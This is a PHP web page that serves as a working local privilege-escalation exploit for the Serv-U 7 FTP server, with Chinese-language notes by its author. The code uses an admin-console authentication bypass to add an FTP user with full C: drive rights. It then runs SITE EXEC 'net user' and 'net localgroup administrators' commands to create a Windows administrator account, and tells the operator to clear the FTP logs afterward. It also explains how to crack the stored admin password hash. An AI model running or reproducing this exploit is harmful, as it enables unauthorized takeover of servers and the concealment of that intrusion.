<?
/*
	serv-u 7 local exp ver 1.0
	www.inbreak.net
	author kxlzx@xiaotou.org 2008-11-19
	modify 2008-11-20 	
*/

/*


下面是用到的主要数据包，给大家研究用。如果你用asp等语言再写一次，可以参考。
Global user list:
GET /Admin/XML/OrganizationUsers.xml&ID=161&sync=1227078625078&ForceList=1 HTTP/1.1
Accept: 
Accept-Language: zh-cn
Referer: http://127.0.0.1:43958/Admin/ServerUsers.htm?Page=1
Content-Type: application/x-www-form-urlencoded
UA-CPU: x86
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)
Host: 127.0.0.1:43958
Connection: Keep-Alive
Cookie: domainid=3841; domainodbc=0; SULang=zh,CN; domainname=g; homelinktip=false; 
killmenothing; 
Session=bbd30833f99ff4a5e8d4d7849358ef196ad7a83539d7cf25fcd0b097930494fbfe8d25787a8544280754
581406246bf8

Global c:\|RWADNELCRNI:
POST /Admin/XML/Result.xml?Command=AddObject&Object=CServer.0.DirAccess&Sync=1227081261640 HTTP/1.1
Accept: 
Accept-Language: zh-cn
Referer: http://127.0.0.1:43958/Admin/ServerDir.htm?Page=1
User-Agent: Serv-U
Content-Type: application/x-www-form-urlencoded
UA-CPU: x86
Accept-Encoding: gzip, deflate
Host: 127.0.0.1:43958
Content-Length: 67
Connection: Keep-Alive
Cache-Control: no-cache
Cookie: domainid=3841; domainodbc=0; SULang=zh,CN; domainname=g; homelinktip=false; killmenothing; Session=bbd30833f99ff4a5e8d4d7849358ef196ad7a83539d7cf25fcd0b097930494fbfe8d25787a8544280754581406246bf8

Access=7999&MaxSize=0&Dir=%2Fc%3A&undefined=undefined&MaxSizeDisp=&

this user c:\|RWADNELCRNI:
POST /Admin/XML/Result.xml?Command=AddObject&Object=CUser.618060.DirAccess&Sync=1227081437828 HTTP/1.1
Accept: 
Accept-Language: zh-cn
Referer: http://127.0.0.1:43958/Admin/ServerUsers.htm?Page=1
User-Agent: Serv-U
Content-Type: application/x-www-form-urlencoded
UA-CPU: x86
Accept-Encoding: gzip, deflate
Host: 127.0.0.1:43958
Content-Length: 67
Connection: Keep-Alive
Cache-Control: no-cache
Cookie: domainid=3841; domainodbc=0; SULang=zh,CN; domainname=g; homelinktip=false; killmenothing; Session=bbd30833f99ff4a5e8d4d7849358ef196ad7a83539d7cf25fcd0b097930494fbfe8d25787a8544280754581406246bf8

Access=7999&MaxSize=0&Dir=%2Fc%3A&undefined=undefined&MaxSizeDisp=&

------------------------------不足之处---------------
期待大家美化这个工具
对su的设置环境要求太多
请大家在这里填写。。

*/
	
?>
<html>
	<title>Serv-u 7 local exp ver 1.0 by kxlzx</title>
	<body>
	<script>
	function fun_showDiv(show)
	{
		document.getElementById(show).style.display="block";
	}
	</script>
	<b>Serv-u 7 local exp ver 1.0 by kxlzx</b>
		<form id="form1" name="form1" method="post" action="?">
				<p><a href="#" onclick="fun_showDiv('adminpassdiv')">管理员密码</a>
				&nbsp; <input type="text" name="admin_pwd" value="" />
			  </p>
			  <p>直接提权！
				&nbsp; <input type="submit" name="cmd" value="提权" />&nbsp;&nbsp;
				<a href="#" onclick="fun_showDiv('QAdiv')">QA</a>
			  </p>
			  <pre>

<?

//Global var
	$port=43958;
	$host="127.0.0.1";
	$sessionid="";
	$getuserid="";
	$ftpport=21;
	$ftpuser="kxlzx_hacked";
	$ftppwd=$_POST['admin_pwd'];
	$exec_addUser="site exec c:/windows/system32/net.exe user ".$ftpuser." ".$ftppwd." /add";
	$exec_addGroup="site exec c:/windows/system32/net.exe localgroup administrators ".$ftpuser."  /add";

if($_POST['cmd']) {

//login-----------------------------------------
	$sock_login = fsockopen($host, $port);
	$URL='/Web%20Client/Login.xml?Command=Login&Sync=1543543543543543';
	$post_data_login['user'] = "";
	$post_data_login['pword'] = $ftppwd;
	$post_data_login['language'] = "zh%2CCN&";
	$ref="http://".$host.":".$port."/?Session=39893&Language=zh,CN&LocalAdmin=1";
	$postStr = createRequest($port,$host,$URL,$post_data_login,$sessionid,$ref);
	fputs($sock_login, $postStr);
	$result = fread($sock_login, 1280);	
	$sessionid = getmidstr("<sessionid>","</sessionid>",$result);
	if ($sessionid!="")
		echo "登陆成功！\r\n";
	fclose($sock_login);
//login-----------------------------------------

//getOrganizationId-------------------------------
	$OrganizationId="";
	$sock_OrganizationId = fsockopen($host, $port);
	$URL='/Admin/ServerUsers.htm?Page=1';
	$postStr = createRequest($port,$host,$URL,"",$sessionid,"");
	fputs($sock_OrganizationId, $postStr);
	$resultOrganizationId="";
	while(!feof($sock_OrganizationId)) {
		$result = fread($sock_OrganizationId, 1024);	
		$resultOrganizationId=$resultOrganizationId.$result;
	}
	$strTmp = "OrganizationUsers.xml&ID=";
	$OrganizationId = substr($resultOrganizationId,strpos($resultOrganizationId,$strTmp)+strlen($strTmp),strlen($strTmp)+15);
	$OrganizationId = substr($OrganizationId,0,strpos($OrganizationId,"\""));
	fclose($sock_OrganizationId);
	if ($OrganizationId!="")
		echo "获取OrganizationId".$OrganizationId."成功！\r\n";
//getOrganizationId-------------------------------

//getuserid---------------------------------------
	$getuserid="";
	$sock_getuserid = fsockopen($host, $port);
	$URL="/Admin/XML/User.xml?Command=AddObject&Object=COrganization.".$OrganizationId.".User&Temp=1&Sync=546666666666666663";
	$ref="http://".$host.":".$port."/Admin/ServerUsers.htm?Page=1";
	$post_data_getuserid="";
	$postStr = createRequest($port,$host,$URL,$post_data_getuserid,$sessionid,$ref);
	fputs($sock_getuserid, $postStr);
	$result = fread($sock_getuserid, 1280);	
	$result = getmidstr("<var name=\"ObjectID\" val=\"","\" />",$result);
	fclose($sock_getuserid);
	$getuserid = $result;
	if ($getuserid!="")
		echo "获取用户ID".$getuserid."成功！\r\n";
//getuserid---------------------------------------

//adduser-----------------------------------------
	$sock_adduser = fsockopen($host, $port);
	$URL="/Admin/XML/Result.xml?Command=UpdateObject&Object=COrganization.".$OrganizationId.".User.".$getuserid."&Sync=1227071190250";
	$post_data_adduser['LoginID'] = $ftpuser;
	$post_data_adduser['FullName'] = "";
	$post_data_adduser['Password'] = 'hahaha';
	$post_data_adduser['ComboPasswordType'] = "%E5%B8%B8%E8%A7%84%E5%AF%86%E7%A0%81";
	$post_data_adduser['PasswordType'] = "0";
	$post_data_adduser['ComboAdminType'] = "%E6%97%A0%E6%9D%83%E9%99%90";
	$post_data_adduser['AdminType'] = "";
	$post_data_adduser['ComboHomeDir'] = "/c:";
	$post_data_adduser['HomeDir'] = "/c:";
	$post_data_adduser['ComboType'] = "%E6%B0%B8%E4%B9%85%E5%B8%90%E6%88%B7";
	$post_data_adduser['Type'] = "0";
	$post_data_adduser['ExpiresOn'] = "0";
	$post_data_adduser['ComboWebClientStartupMode'] = "%E6%8F%90%E7%A4%BA%E7%94%A8%E6%88%B7%E4%BD%BF%E7%94%A8%E4%BD%95%E7%A7%8D%E5%AE%A2%E6%88%B7%E7%AB%AF";
	$post_data_adduser['WebClientStartupMode'] = "";
	$post_data_adduser['LockInHomeDir'] = "0";
	$post_data_adduser['Enabled'] = "1";
	$post_data_adduser['AlwaysAllowLogin'] = "1";
	$post_data_adduser['Description'] = "";
	$post_data_adduser['IncludeRespCodesInMsgFiles'] = "";
	$post_data_adduser['ComboSignOnMessageFilePath'] = "";
	$post_data_adduser['SignOnMessageFilePath'] = "";
	$post_data_adduser['SignOnMessage'] = "";
	$post_data_adduser['SignOnMessageText'] = "";
	$post_data_adduser['ComboLimitType'] = "%E8%BF%9E%E6%8E%A5";
	$post_data_adduser['LimitType'] = "Connection";
	$post_data_adduser['QuotaBytes'] = "0";
	$post_data_adduser['Quota'] = "0";
	$post_data_adduser['Access'] = "7999";
	$post_data_adduser['MaxSize'] = "0";
	$post_data_adduser['Dir'] = "%25HOME%25";
	$postStr = createRequest($port,$host,$URL,$post_data_adduser,$sessionid,"http://127.0.0.1".":".$port."/Admin/ServerUsers.htm?Page=1");
	fputs($sock_adduser, $postStr,strlen($postStr));
	$result = fread($sock_adduser, 1280);	
	fclose($sock_adduser);
	echo "添加用户成功！\r\n";
//adduser-----------------------------------------

//addpower-----------------------------------------
	$sock_addpower = fsockopen($host, $port);
	$URL="/Admin/XML/Result.xml?Command=AddObject&Object=CUser.".$getuserid.".DirAccess&Sync=1227081437828";
	$post_data_addpower['Access'] = "7999";
	$post_data_addpower['MaxSize'] = "0";
	$post_data_addpower['Dir'] = "/c:";
	$post_data_addpower['undefined'] = "undefined";
	$postStr = createRequest($port,$host,$URL,$post_data_addpower,$sessionid,"http://127.0.0.1".":".$port."/Admin/ServerUsers.htm?Page=1");
	fputs($sock_addpower, $postStr,strlen($postStr));
	$result = fread($sock_addpower, 1280);	
	fclose($sock_addpower);
	echo "添加权限成功！\r\n";

//addpower-----------------------------------------

//exec-------------------------------
	$sock_exec = fsockopen("127.0.0.1", $ftpport, &$errno, &$errstr, 10);
	$recvbuf = fgets($sock_exec, 1024);
	$sendbuf = "USER ".$ftpuser."\r\n";
	fputs($sock_exec, $sendbuf, strlen($sendbuf));
	$recvbuf = fgets($sock_exec, 1024);

	$sendbuf = "PASS hahaha\r\n";
	fputs($sock_exec, $sendbuf, strlen($sendbuf));
	$recvbuf = fgets($sock_exec, 1024);

	$sendbuf = $exec_addUser."\r\n";
	fputs($sock_exec, $sendbuf, strlen($sendbuf));
	$recvbuf = fread($sock_exec, 1024);
	echo "执行".$exec_addUser."\r\n返回了$recvbuf\r\n";
	

	$sendbuf = $exec_addGroup."\r\n";
	fputs($sock_exec, $sendbuf, strlen($sendbuf));
	$recvbuf = fread($sock_exec, 1024);

	echo "执行".$exec_addGroup."\r\n返回了$recvbuf\r\n";
	fclose($sock_exec);
	echo "好了，自己3389上去清理ftp用户日志吧！\r\n";
//exec-------------------------------

}

/** function createRequest
	@author : kxlzx 2008-11-19
	@port_post : administrator port $port=43958;
	@host_post : host $host="127.0.0.1";
	@URL_post : target $URL='/Web%20Client/Login.xml?Command=Login&Sync=1543543543543543';
	@post_data_post : arraylist $post_data['user'] = "";...
	@return httprequest string
*/
function createRequest($port_post,$host_post,$URL_post,$post_data_post,$sessionid,$referer){
	$data_string="";
	if ($post_data_post!="")
	{
		foreach($post_data_post as $key=>$value)
		{
			$values[]="$key=".urlencode($value);
		}
		$data_string=implode("&",$values);
	}
	$request.="POST ".$URL_post." HTTP/1.1\r\n";
	$request.="Host: ".$host_post."\r\n";
	$request.="Referer: ".$referer."\r\n";
	$request.="Content-type: application/x-www-form-urlencoded\r\n";
	$request.="Content-length: ".strlen($data_string)."\r\n";
	$request.="User-Agent: Serv-U\r\n";
	$request.="x-user-agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)\r\n";
	$request.="Accept: */*\r\n";
	$request.="Cache-Contro: no-cache\r\n";
	$request.="UA-CPU: x86\r\n";
	
	if ($sessionid!="")
	{
		$request.="Cookie: Session=".$sessionid."\r\n";
	}
	$request.="\r\n";
	$request.=$data_string."\r\n";

	return $request;
}

//getMidfor2str copy from internet
function getmidstr($L,$R,$str)
{  
	$int_l=strpos($str,$L);
	$int_r=strpos($str,$R);
	If ($int_l>-1&&$int_l>-1)
	{
		$str_put=substr($str,$int_l+strlen($L),($int_r-$int_l-strlen($L)));
		return $str_put;
	}
	else
		return "没找到需要的变量，请联系kxlzx@xiaotou.org";
}
?>
			  </pre>
		</form>
<div id="adminpassdiv" style="display:none">
<pre>
默认为空，如果密码为空，<b>填什么都能进去。</b>
如果修改过，管理员密码默认会在这里：
<b>C:\Program Files\RhinoSoft.com\Serv-U\Users\Local Administrator Domain\.Archive</b>
文件中找到一个MD5密码值。
C:\Program Files\RhinoSoft.com\Serv-U
是su的根目录。
密码值的样式为(假设是123456)
kx#######################
#代表123456的32位MD5加密，而kx则是su对md5的密码算法改进的随机2位字符。
破解后的密码为<b>kx</b>123456，去掉kx就是密码了。
你可以针对这个加密生成字典。

auther:kxlzx www.inbreak.net
</pre>
</div>
<div id="QAdiv" style="display:none">
<pre>
<b>一，su7是提权有几种方式？</b>
	有两种形式去干掉su7。
	1>，登陆管理员控制台的页面
			==>获取OrganizationId，用于添加用户
			==>获取全局用户的“下一个新用户ID”
			==>添加用户
			==>添加用户的权限 or 添加全局用户权限
			==>用户登陆
			==>执行系统命令添加系统账户。
	2>，登陆管理员控制台页面
			==>基本WEB客户端
			==>来到serv-u的目录下--users--Global user目录
			==>上传一个你已经定义好的用户文件
			==>用户登陆
			==>执行系统命令添加系统账户
	而本文件使用了<b>第一种</b>方法。
<b>二，提权的原理？</b>
	Su7的管理平台是http的，很先进。
	抓包，分析，发现了以下路程是可以利用的。
	1，	管理员从管理控制台打开web页面时，是不需要验证密码的。
	2，	管理员如果用某URL打开web页面时，虽然需要输入密码，但是无论输入什么，都可以进入。“/?Session=39893&Language=zh,CN&LocalAdmin=1”
	3，	管理员可以添加用户有两种，一种是全局用户，一种是某个域下的用户。而权限设置也是两种，一种是全局，一种是针对用户。
	4，	管理员添加了用户的这个包和设置权限这个包，是分开的。
	所以，我可以抓包然后转换成php的socket连接post出去。
	最后在用经典的ftp登陆，exec命令。达到提权。
	在写php的过程中，遇到很多问题，比如函数不会用等等（—_—!以前没学过php），感谢“云舒牛”帮忙。。。
	在分析包的流程，发现了一些特征，服务器返回的数据，全是以xml格式发来的。而在数据传输的过程中，设计的很经典。
	Su7也有自己的数据库，他也会自己生成一个id。
	这个ID是随机的，在你创建用户时，会先请求服务器生成一个，生成好后，修改该id的用户名，密码等。
	这很像oracle的insert手段。

	写工具的过程中，遇到很多麻烦，最大的麻烦就是这个ID问题，后来分析出来了。
	添加权限时，也是可以利用这个ID的。
	于是工具一共连接了6次服务器，这几次分别是：
	1，	用来登陆平台，使用那个输入任何密码都可以登陆的页面地址。返回一个sessionid，这个sessionid在以后的包都用到了。
	2，	获取OrganizationId，用于添加用户
	3，	用来请求一个用户ID。
	4，	修改该ID的登陆用户名，密码。
	5，	修改该ID的权限，加c盘的写删执行等。
	6，	这次连接是做坏事的，使用前面添加的用户执行系统命令。
<b>三，为啥我明明显示成功了，但是却提不上去？</b>
	这要看错误代码了，这里偶很惭愧，并没有写详细的错误代码判断。
	一般有以下几种情况：
	1，可能是因为管理员密码不对。
		参照管理员密码的连接。
	2，可能是因为管理员限制了执行SITE EXEC。
		有待程序修改，程序可以加一个让他不限制的功能。
	3，可能是程序问题。
	<b>4，为啥作者有这么多理由不去改？</b>
	你没发现么？一旦把东西做完美了，那比较系统的防御方案就出来了。
	如果不完美，让他以为我们就这点手段，防御系统也会这么认为。
	不信的话，过段时间，防御方案出来了，肯定有一条：“修改site exec为不可访问”。
	到时候，我再写个功能，把这玩意改回来就是。
	所以，等大家都提倡要XXXX的时候，我再解决XXXX的问题。大家先这么玩着吧:)







auther:kxlzx www.inbreak.net



</pre>
</div>
	</body>
</html>